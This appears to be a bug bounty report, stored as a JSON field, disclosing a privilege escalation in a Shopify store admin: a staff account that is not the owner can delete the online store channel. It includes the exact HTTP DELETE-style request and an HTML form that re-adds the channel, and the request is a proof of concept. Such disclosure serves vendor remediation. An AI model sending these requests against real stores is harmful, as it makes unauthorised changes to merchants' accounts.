  "vulnerability_information": "Hi , I have found an issue that allows a non-owner user with full access permissions or access to /channels  to remove the online store channel while only the store owner can remove it!\n\n#Steps to reproduce:\n1. Login with a non-owner user who has full access permissions\n2. Send this request: \n\n```\nPOST /admin/channels/<Online_store_channel_id> HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nOrigin: https://<your_shop>.myshopify.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.8\nCookie: <Staff_Member_cookies>\n\n_method=delete&authenticity_token=<Your_token>\n```\n\nThen go to `*yourstore.myshopify.com/admin/channels` and you'll see that the channel was removed causing an error with the plan.\n\nThe staff member can also re-add the channel by submitting the following form:\n\n```\n<form method=\"post\" action=\"/admin/channels?channel%5Bprovider_id%5D=1&amp;resolve_redirect_url=%2Fadmin%2Fchannels\">\n<input type=\"submit\" value=\"Re-add channel\">\n<input name=\"authenticity_token\" value=\"<yout_token>\">\n</form>\n```\n\nThis is clearly a privilege escalation issue , since when you go to channels with a non-owner account , it says that you have to contact the owner to remove the online store channel which means that only the owner should be able to remove it.\n",
